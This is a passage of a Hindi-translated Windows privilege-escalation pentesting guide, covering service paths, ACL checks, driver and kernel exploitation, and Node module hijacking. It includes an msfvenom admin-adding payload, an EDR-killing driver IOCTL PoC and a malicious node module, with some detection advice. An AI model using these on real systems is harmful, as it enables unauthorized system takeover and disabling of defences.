for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**आप इस vulnerability को metasploit से detect और exploit कर सकते हैं:** `exploit/windows/local/trusted\_service\_path` आप metasploit से manually एक service binary बना सकते हैं:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Recovery Actions

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने देता है कि कोई service विफल होने पर कौन-सी कार्रवाइयाँ की जाएँ। इस सुविधा को किसी binary की ओर point करने के लिए configure किया जा सकता है। यदि इस binary को replace किया जा सकता है, तो privilege escalation संभव हो सकता है। अधिक जानकारी [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## Scheduled task script targets

ऐसे enabled task के लिए जो `.bat` या `.cmd` file के साथ `cmd.exe /c` चलाता है, **action arguments** में दिए गए script के साथ-साथ `cmd.exe` को भी जाँचें। यही बात interpreter के स्पष्ट file argument पर भी लागू होती है, जैसे PowerShell का `-File`। यदि scheduled batch file में literal PowerShell `-File` call है, तो उस referenced script के ACL की भी जाँच करें; variables, conditionals और shell chaining को manually trace करना ज़रूरी है। Caller द्वारा लिखे जा सकने वाला script या parent directory, cross-account execution का lead तभी है जब configured task principal caller से अलग हो और task वास्तव में उस action तक पहुँचे। Scripts के लिए append-only ACL मायने रख सकता है, लेकिन पहले से मौजूद `exit` या अन्य control flow के कारण जोड़ी गई lines तक पहुँचना संभव न हो। privilege escalation का दावा करने से पहले effective ACLs, [task execution context](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), working directory, trigger और application-control policy की पुष्टि करें। Inventory के दौरान script में बदलाव न करें और task शुरू न करें।

## Accessible files में named streams

NTFS पर किसी readable file में named `:$DATA` stream हो सकता है, जिसका content सामान्य directory listing में दिखाई नहीं देता। सुलभ backups या configuration files के छोटे, प्रासंगिक समूह के लिए, कोई content खोलने से पहले stream के **names and sizes** देखें; Windows इन्हें [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) और PowerShell के [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) के ज़रिए दिखाता है। Secret का संकेत देने वाला stream name केवल एक lead है। File की effective read access, filesystem का stream support, stream में उपयोगी credentials मौजूद हैं या नहीं, और वे वास्तव में किस account से authenticate होते हैं—इन सबकी जाँच करें। नियमित enumeration के दौरान recursive stream scans करने और stream contents print करने से बचें।

## Scheduled Windows Driver Kit helper inputs

वैकल्पिक Windows Driver Kit में `StandaloneRunner.exe` शामिल है, जो अपनी run directory से `command.txt`, `reboot.rsf` और project की `working\rsf.rsf` file का उपयोग कर सकता है। यदि कोई scheduled task या service इस helper को privileged account से शुरू करती है, तो इन inputs पर low-privilege write access उस account के context में command execution करा सकती है, भले ही helper executable स्वयं protected हो। पुष्टि करें कि privileged consumer मौजूद है और **दोनों** sidecar files बनाई या modify की जा सकती हैं; केवल helper मिलना पर्याप्त नहीं है।

Scheduled task के लिए, उसके action की [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) और दोनों sidecar paths के ACLs की जाँच करें। यदि task working directory निर्दिष्ट नहीं करता, तो executable की directory केवल जाँचने लायक एक lead है—यह इस बात का प्रमाण नहीं कि task अपने inputs वहीं से पढ़ता है। Project की working-file prerequisite भी पूरी होनी चाहिए। यह मानने के बजाय कि task SYSTEM के रूप में चलता है, उसके actual task principal की जाँच करें।

## Applications

### Installed Applications

**binaries की permissions** जाँचें (शायद आप किसी binary को overwrite करके privileges escalate कर सकें) और **folders** की permissions भी ([DLL Hijacking](dll-hijacking/index.html))।

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent repair path

[CVE-2024-0670](https://checkmk.com/werk/16361) पुराने Checkmk Windows agents को प्रभावित करता है, जो `C:\Windows\Temp` में command files लिखते थे और replacement विफल होने पर पहले से मौजूद write-protected file को execute कर देते थे। Vendor ने इस समस्या को 2.1.0p40, 2.2.0p23, 2.3.0b1 और 2.4.0b1 में ठीक किया। Installed patch level का पूरा विवरण और यह जाँचें कि प्रभावित agent operation चल सकता है या नहीं; केवल `2.1` जैसा branch label exposure की पुष्टि नहीं करता। Enumeration में version, service state और Temp permissions की जाँच बिना files बनाए या agent commands चलाए की जा सकती है।

#### ADSelfService Plus SAML service review

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) ने ADSelfService Plus build 6210 और उससे पुराने builds को प्रभावित किया; vendor ने इसे build 6211 में ठीक किया। यह केवल तभी प्रासंगिक है जब SAML SSO **enabled है या पहले enabled था**। इसलिए installed-product entry या service path केवल एक सुराग है, vulnerability का निष्कर्ष नहीं: exact build, SAML configuration history, service की network reachability और उसके चलने वाले account की पुष्टि करें। Service के ज़रिए code execution को उसी account के privileges मिलते हैं; SYSTEM execution के लिए instance का SYSTEM के रूप में चलना आवश्यक है। Product के Backup directory में पढ़ी जा सकने वाली `OfflineBackup_*.ezip` एक अलग encrypted backup का सुराग है, किसी उपयोगी credential या इस SAML flaw का प्रमाण नहीं। Routine enumeration के दौरान इसे unpack किए बिना इसका path और access rights दर्ज करें।

#### Jenkins controller and domain-account boundaries

Windows Jenkins controller पर, job बनाने या configure करने की permission को उसे शुरू करने की permission से अलग रखें: [Jenkins इन्हें अलग `Job/Create`, `Job/Configure` और `Job/Build` rights के रूप में दस्तावेज़ करता है](https://www.jenkins.io/doc/book/security/access-control/permissions/). Configured schedule या remote trigger से build का एक और रास्ता मिल सकता है, लेकिन पुष्टि करें कि वह enabled है और build वास्तव में चलता है। Execution को controller या चुने गए agent की identity मिलती है, और stored credential तभी इस्तेमाल किया जा सकता है जब job को उसके scope तक access हो। अलग से, `JENKINS_HOME` metadata तक access की जाँच करें: Jenkins credential material और encryption keys को `credentials.xml`, `secrets/hudson.util.Secret` और `secrets/master.key` में रखता है ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). केवल इनका मौजूद होना password उजागर नहीं करता; साझा output में secrets दिखाए बिना **ज़रूरी files तक read access** और account-reuse का अलग रास्ता सत्यापित करें। यदि उस account के पास AD user-object `scriptPath` पर write right है, तो cross-user execution मानने से पहले writable script path और target user के रूप में चलने वाले वास्तविक logon या scheduled consumer की पुष्टि करें। आगे का group control अलग से सत्यापित किए गए effective AD rights पर निर्भर करता है।

#### Azure Pipelines self-hosted agent identity

Azure DevOps Server या Azure Pipelines project में, pipeline **बनाने या edit करने** की permission को उसे **queue** करने और चुने गए agent pool का उपयोग करने की permission से अलग रखें; [Microsoft pipeline permissions](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) और [pool authorization](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) को अलग-अलग दस्तावेज़ करता है। यदि कम privileges वाला account script step submit कर सकता है और उस pipeline को self-hosted Windows agent पर चला सकता है, तो step [agent के configured operating-system account](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) के रूप में execute होता है। Cross-user या SYSTEM transition का दावा करने से पहले exact pipeline, branch/resource restrictions, authorized pool, runnable job और agent service identity की पुष्टि करें। Installed agent, project role या repository write access अपने-आप में केवल एक सुराग है; passive enumeration के दौरान build शुरू किए बिना permissions और local service metadata की समीक्षा करें।

#### Microsoft Entra Connect Sync credentials

[Microsoft अलग-अलग बताता है](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) कि **ADSync service account** synchronization service चलाता है और उसके SQL database तक access करता है, जबकि **AD DS connector account** की directory permissions configured sync features पर निर्भर करती हैं। Connector credentials उस database में encrypted रूप में रखे जाते हैं और key material [ADSync service account के तहत DPAPI द्वारा protected होता है](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Installed sync service, स्थानीय administrator-जैसा दिखने वाला group या database की visibility भर से decrypt किए जा सकने वाले credential या domain escalation की पुष्टि नहीं होती। वास्तविक database read rights, service-account/key access, installation और SQL layout, configured connector identity तथा उस identity के effective AD privileges की अलग-अलग समीक्षा करें। Routine enumeration में केवल service और access metadata दिखाएँ; stored secrets को query या print न करें।

#### Printer driver support DLL permissions

Installed printer driver अपनी support DLLs को `C:\ProgramData` के अंतर्गत रख सकता है और उन्हें अधिक privileged print process में load कर सकता है। Printer WMI enumeration की अनुमति न होने पर भी exact driver directory और DLL ACLs की समीक्षा करें, जिसमें parent directories और reparse points शामिल हों। [Ricoh printer-driver issue CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) के लिए रिपोर्ट किया गया path `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` था; [मूल disclosure](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) में `PrintIsolationHost.exe` द्वारा DLL loading का वर्णन है। Writable ACL केवल एक सुराग है: deny entries के बाद effective write access, संबंधित driver का installed होना और privileged identity के तहत उस file को load करना, तथा vendor के updated driver या security program द्वारा installation का ठीक किया जाना सत्यापित करें। केवल directory name या driver version के आधार पर vulnerability का निष्कर्ष न निकालें।

### Write Permissions

जाँचें कि क्या आप किसी config file को modify करके किसी special file को read कर सकते हैं, या किसी ऐसे binary को modify कर सकते हैं जिसे Administrator account execute करेगा (schedtasks)।

System में कमज़ोर folder/file permissions खोजने का एक तरीका यह है:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ अपने `plugins` subfolders में मौजूद किसी भी plugin DLL को autoload करता है। यदि कोई writable portable/copy install मौजूद है, तो एक malicious plugin रखने से हर launch पर `notepad++.exe` के अंदर automatic code execution होता है (जिसमें `DllMain` और plugin callbacks भी शामिल हैं)।

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### स्टार्टअप पर चलाना

**जाँचें कि क्या आप किसी ऐसी registry entry या binary को overwrite कर सकते हैं, जिसे कोई दूसरा user execute करने वाला हो।**\
**प्रिविलेज बढ़ाने के लिए उपयोगी autoruns locations** के बारे में अधिक जानने के लिए **यह पेज पढ़ें**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **third-party अजीब/vulnerable** drivers खोजें

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

यदि कोई driver arbitrary kernel read/write primitive (खराब तरीके से डिज़ाइन किए गए IOCTL handlers में आम) उपलब्ध कराता है, तो आप सीधे kernel memory से SYSTEM token चुराकर privilege escalate कर सकते हैं।<sup>[[13]](#references)</sup> चरण-दर-चरण तकनीक यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

संबंधित Windows kernel-exploitation सामग्री:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

ऐसे race-condition bugs में, जहाँ vulnerable call attacker-controlled Object Manager path खोलता है, lookup को जानबूझकर धीमा करने (max-length components या गहरी directory chains का उपयोग करके) से समय-सीमा microseconds से बढ़ाकर दसियों microseconds तक की जा सकती है:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures, और I/O ring pivots

कुछ Windows kernel LPE chains दो अलग-अलग कमज़ोर bugs से बनाई जा सकती हैं: एक **cancel-safe queue lifetime race**, जो queue lock के अभी held होने पर request/CBD को free कर देती है, और एक **lock-release-before-copy** disclosure, जो `RtlCopyToUser` के दौरान freed paged-pool allocation को leak करती है।<sup>[[29]](#references)</sup>

Audit और exploitation संबंधी नोट्स:

- **Free-under-lock + बाद में cancel**: ऐसा success path खोजें जो **Acquire -> CompleteRequest/free -> Release** करता हो, जबकि cancel path **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** करता हो। यदि success path, CBDQ/CSQ lock release करने से पहले `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` तक पहुँचता है, तो `NtCancelIoFileEx -> IopCsqCancelRoutine` में blocked thread बाद में आगे बढ़कर freed `PFLT_CALLBACK_DATA` को driver के remove callback में दे सकता है।
- **Freed queue object को reclaim करें**: उसी आकार का attacker-controlled paged-pool allocation इस्तेमाल करें। `NPFS` Data Queue Entries उपयोगी हैं, क्योंकि उनका payload और size नियंत्रित किया जा सकता है और बाद में pipe read/peek operations से उन्हें probe किया जा सकता है। यदि freed object में list links हों, तो उन्हें user memory में **fake request nodes की cyclic list** से overwrite करें, ताकि driver मूल list head पर रुकने के बजाय बार-बार attacker-defined request structures को process करे।
- **Predictable write को upgrade करें**: यदि fake request bookkeeping writes (timestamps / QPC / refcount-adjacent fields) द्वारा इस्तेमाल किए गए nested context pointer को redirect करता है, तो आपको **address-controlled लेकिन value-controlled नहीं** kernel write मिल सकता है। ऐसी स्थिति में, अंतिम code/data pointer के बजाय sprayed pool object के **length/size** field को target करें, फिर spray में तब तक खोजें जब तक corrupted object से **out-of-bounds paged-pool read** न मिल जाए।
- **Raceable disclosure pattern**: ऐसा कोई भी syscall जो `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` करता हो, एक अच्छा candidate है। यदि attacker copied buffer को बड़ा कर सकता है (उदाहरण के लिए, serializer के final allocation size को बढ़ाने वाली कई list/resource entries जोड़कर), तो reliability बेहतर होती है, क्योंकि लंबा copy replacement window बढ़ाता है और ज़रूरी नहीं कि machine crash हो।
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer arrays disclosure के लिए बेहतरीन targets हैं, क्योंकि उनका paged-pool size attacker-controlled होता है (`8 * regBufferCnt`) और हर element `_IOP_MC_BUFFER_ENTRY` का kernel pointer होता है। इनमें से किसी एक array को leak करें, आसपास का `IORING_OBJECT` खोजें, फिर **`RegBuffers`** और **`RegBuffersCount`** को corrupt करें, ताकि बाद के I/O ring operations attacker-forged entries का इस्तेमाल करें और arbitrary kernel read/write दें। यदि उपलब्ध एकमात्र write से आपको कोई स्थिर byte मिलता है (उदाहरण के लिए `KUSER_SHARED_DATA+0x14` से), तो `0x0101010101010101` जैसा repeated-byte user pointer बनाने के लिए **overlapping unaligned writes** इस्तेमाल करें, उसे `VirtualAlloc` से map करें, और forged registered-buffer array वहाँ रखें।<sup>[[30]](#references)</sup>

उपयोगी debugging संकेत:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Corrupted I/O ring से arbitrary kernel read/write प्राप्त करने के बाद, standard post-primitive workflow का उपयोग करके SYSTEM token चुरा लें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

आधुनिक hive vulnerabilities से deterministic layouts तैयार किए जा सकते हैं, writable HKLM/HKU descendants का दुरुपयोग किया जा सकता है, और custom driver के बिना metadata corruption को kernel paged-pool overflows में बदला जा सकता है। पूरी chain यहाँ जानें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Attacker-controlled paths से `RtlQueryRegistryValues` direct-mode type confusion

कुछ drivers userland से registry path स्वीकार करते हैं, केवल यह जाँचते हैं कि वह एक मान्य UTF-16 string है, और फिर stack scalar जैसे `int readValue` में `RTL_QUERY_REGISTRY_DIRECT` के साथ `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` को call करते हैं। यदि `RTL_QUERY_REGISTRY_TYPECHECK` मौजूद नहीं है, तो `EntryContext` की व्याख्या developer की अपेक्षित type के बजाय **वास्तविक** registry type के अनुसार की जाती है।

इससे दो उपयोगी primitives बनते हैं:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: user-controlled absolute `\Registry\...` path से driver attacker-chosen keys को query कर सकता है, return codes/logs के ज़रिए उनके मौजूद होने की जानकारी leak कर सकता है, और कभी-कभी वे values पढ़ सकता है जिन्हें caller सीधे access नहीं कर सकता।
- **Kernel memory corruption**: `&readValue` जैसा scalar destination, registry value type के आधार पर `REG_QWORD`, `UNICODE_STRING`, या sized binary buffer के रूप में type-confused हो जाता है।

व्यावहारिक exploitation नोट्स:

- **Windows 8+ mitigation**: यदि query किसी **untrusted hive** को `RTL_QUERY_REGISTRY_DIRECT` के साथ, लेकिन `RTL_QUERY_REGISTRY_TYPECHECK` के बिना access करती है, तो kernel callers `KERNEL_SECURITY_CHECK_FAILURE (0x139)` के साथ crash हो जाते हैं। Exploitability बनाए रखने के लिए, `HKCU` के अंतर्गत values stage करने के बजाय **trusted system hives के अंदर attacker-writable keys** खोजें।
- **Trusted-hive staging**: `\Registry\Machine` के writable descendants enumerate करने के लिए NtObjectManager का उपयोग करें, और sandboxed contexts से accessible keys खोजने के लिए duplicated **low-integrity** token के साथ scan दोबारा चलाएँ:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte `int` में 8-byte का direct write adjacent stack data को corrupt करता है और पास के callback/function pointer को आंशिक रूप से overwrite कर सकता है।
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode में `EntryContext` का `UNICODE_STRING` की ओर point करना अपेक्षित है। यदि code पहले attacker-controlled `REG_DWORD` को stack scalar में load करता है और फिर उसी buffer को string read के लिए दोबारा इस्तेमाल करता है, तो attacker `Length`/`MaximumLength` को नियंत्रित करता है और `Buffer` pointer को आंशिक रूप से प्रभावित करता है, जिससे semi-controlled kernel write मिलता है।
- **`REG_BINARY`**: बड़े binary data के लिए, direct mode `EntryContext` पर पहले `LONG` को signed buffer size मानता है। यदि पिछला `REG_DWORD` read दोबारा इस्तेमाल किए गए scalar में attacker-controlled **negative** value छोड़ता है, तो अगली `REG_BINARY` query attacker के bytes को सीधे adjacent stack slots पर copy करती है। यह अक्सर callback-pointer को पूरी तरह overwrite करने का सबसे साफ़ तरीका होता है।

मज़बूत hunting pattern: **बिना दोबारा initialize किए, एक ही stack variable में अलग-अलग प्रकार के registry reads करना**। `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, दोबारा इस्तेमाल किए गए `EntryContext` pointers, और ऐसे code paths खोजें जहाँ पहला registry read यह नियंत्रित करता हो कि दूसरा read होगा या नहीं।

#### Device objects पर FILE_DEVICE_SECURE_OPEN सेट न होने का दुरुपयोग (LPE + EDR kill)

कुछ signed third-party drivers `IoCreateDeviceSecure` के ज़रिए मज़बूत SDDL के साथ अपना device object बनाते हैं, लेकिन `DeviceCharacteristics` में `FILE_DEVICE_SECURE_OPEN` सेट करना भूल जाते हैं। इस flag के बिना, जब device को ऐसे path के ज़रिए खोला जाता है जिसमें एक अतिरिक्त component हो, तो secure DACL लागू नहीं होता। इससे कोई भी unprivileged user इस तरह का namespace path इस्तेमाल करके handle प्राप्त कर सकता है:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (एक वास्तविक मामले से)

Device खोल पाने के बाद, driver द्वारा उजागर किए गए privileged IOCTLs का LPE और tampering के लिए दुरुपयोग किया जा सकता है। वास्तविक मामलों में देखी गई क्षमताओं के उदाहरण:
- मनमाने processes के full-access handles लौटाना (token theft / DuplicateTokenEx/CreateProcessAsUser के ज़रिए SYSTEM shell)।
- बिना किसी रोक-टोक के raw disk read/write (offline tampering, boot-time persistence की तरकीबें)।
- मनमाने processes को terminate करना, जिनमें Protected Process/Light (PP/PPL) भी शामिल हैं। इससे user land से kernel के ज़रिए AV/EDR kill किया जा सकता है।

न्यूनतम PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

डेवलपर्स के लिए शमन उपाय
- DACL से प्रतिबंधित किए जाने वाले device objects बनाते समय हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- विशेषाधिकार प्राप्त operations के लिए caller context की पुष्टि करें। Process termination या handles लौटाने की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को सीमित करें (access masks, METHOD_*, input validation) और सीधे kernel privileges के बजाय brokered models पर विचार करें।

रक्षकों के लिए detection के विचार
- संदिग्ध device names (जैसे, `\\ .\\amsdk*`) को user-mode से खोलने और दुरुपयोग का संकेत देने वाले विशिष्ट IOCTL sequences पर नज़र रखें।
- Microsoft की vulnerable driver blocklist (HVCI/WDAC/Smart App Control) लागू करें और अपनी allow/deny lists बनाए रखें।

## PATH DLL Hijacking

यदि आपके पास **PATH में मौजूद किसी folder के अंदर write permissions** हैं, तो आप किसी process द्वारा load की गई DLL को hijack करके **privileges escalate** कर सकते हैं।<sup>[[2]](#references)</sup>

PATH के अंदर मौजूद सभी folders की permissions जांचें:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

इस check का दुरुपयोग कैसे करें, इसकी अधिक जानकारी के लिए:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` के ज़रिए Node.js / Electron module resolution hijacking

यह **Windows uncontrolled search path** का एक प्रकार है, जो **Node.js** और **Electron** applications को तब प्रभावित करता है, जब वे `require("foo")` जैसा bare import करते हैं और अपेक्षित module **मौजूद नहीं होता**।<sup>[[20]](#references)</sup>

Node packages को खोजने के लिए directory tree में ऊपर की ओर जाता है और हर parent में `node_modules` folders जाँचता है। Windows पर यह खोज drive root तक पहुँच सकती है, इसलिए `C:\Users\Administrator\project\app.js` से launch किया गया application इन paths को जाँच सकता है:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

अगर कोई **low-privileged user** `C:\node_modules` बना सकता है, तो वह वहाँ malicious `foo.js` (या package folder) रख सकता है और **higher-privileged Node/Electron process** के missing dependency को resolve करने की प्रतीक्षा कर सकता है। Payload victim process के security context में execute होता है। इसलिए, जब target administrator के रूप में, elevated scheduled task/service wrapper से, या auto-started privileged desktop app के रूप में चलता है, तो यह **LPE** बन जाता है।

यह खास तौर पर तब आम है, जब:

- कोई dependency `optionalDependencies` में घोषित हो<sup>[[22]](#references)</sup>
- कोई third-party library `require("foo")` को `try/catch` में रखती हो और failure पर आगे बढ़ती हो
- कोई package production builds से हटा दिया गया हो, packaging के दौरान छूट गया हो, या install होने में विफल रहा हो
- vulnerable `require()` मुख्य application code के बजाय dependency tree में गहराई में हो

### Vulnerable targets की तलाश

Resolution path को साबित करने के लिए **Procmon** का इस्तेमाल करें:<sup>[[23]](#references)</sup>

- `Process Name` को target executable (`node.exe`, Electron app EXE, या wrapper process) पर filter करें
- `Path` को `contains` `node_modules` पर filter करें
- `NAME NOT FOUND` और `C:\node_modules` के अंदर हुए अंतिम successful open पर ध्यान दें

Unpacked `.asar` files या application sources में code review के लिए उपयोगी patterns:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon या source review से **missing package name** पहचानें।
2. यदि root lookup directory पहले से मौजूद न हो, तो उसे बनाएँ:

```powershell
mkdir C:\node_modules
```

3. अपेक्षित सटीक नाम वाला एक module डालें:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. victim application को trigger करें। यदि application `require("foo")` करने की कोशिश करता है और legitimate module मौजूद नहीं है, तो Node `C:\node_modules\foo.js` लोड कर सकता है।

इस pattern में फिट होने वाले missing optional modules के वास्तविक उदाहरणों में `bluebird` और `utf-8-validate` शामिल हैं, लेकिन दोबारा उपयोग करने योग्य हिस्सा **technique** है: ऐसा कोई भी **missing bare import** खोजें जिसे कोई privileged Windows Node/Electron process resolve करेगा।

### Detection और hardening के विचार

- जब कोई user `C:\node_modules` बनाए या वहाँ नई `.js` files/packages लिखे, तो alert करें।
- `C:\node_modules\*` से पढ़ने वाले high-integrity processes की तलाश करें।
- Production में सभी runtime dependencies को package करें और `optionalDependencies` के उपयोग का audit करें।
- Silent `try { require("...") } catch {}` patterns के लिए third-party code की समीक्षा करें।
- जब library इसका समर्थन करती हो, तो optional probes disable करें (उदाहरण के लिए, कुछ `ws` deployments `WS_NO_UTF_8_VALIDATE=1` के साथ legacy `utf-8-validate` probe से बच सकते हैं)।

## Network

### Shares

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

hosts file में hardcoded अन्य ज्ञात कंप्यूटरों की जाँच करें

```
type C:\Windows\System32\drivers\etc\hosts
```

### नेटवर्क इंटरफ़ेस और DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### खुले पोर्ट

बाहरी ओर से **प्रतिबंधित सेवाओं** की जाँच करें

```bash
netstat -ano #Opened ports?
```

Local listener के लिए, उसके PID को process owner, executable path और उसे शुरू करने वाली किसी service या scheduled task से मिलाएँ। Remote-control service आपको उसके desktop user के रूप में access तभी दे सकती है, जब उसका authentication और command controls इसकी अनुमति दें। Higher-privileged account के रूप में चल रहा custom TCP application अलग से review करने का लक्ष्य है: listener और binary path केवल passive leads हैं, जबकि authenticated memory-corruption route के लिए उसी binary और उसके reachable input का analysis आवश्यक है। यदि कोई exposed port system process का लगता है, तो backend service का attribution करने से पहले उसकी तुलना [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) से करें; केवल forwarding rule यह साबित नहीं करता कि destination reachable या vulnerable है।

### रूटिंग टेबल

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP तालिका

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### फ़ायरवॉल नियम

[**फ़ायरवॉल से संबंधित commands के लिए यह पेज देखें**](../basic-cmd-for-pentesters.md#firewall) **(नियमों की सूची बनाना, नियम बनाना, बंद करना, बंद करना...)**

[नेटवर्क enumeration के लिए और commands यहाँ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है।

अगर आपको root user मिल जाए, तो आप किसी भी port पर listen कर सकते हैं (पहली बार `nc.exe` से किसी port पर listen करने पर GUI के ज़रिए पूछा जाएगा कि क्या `nc` को firewall द्वारा अनुमति दी जानी चाहिए)।

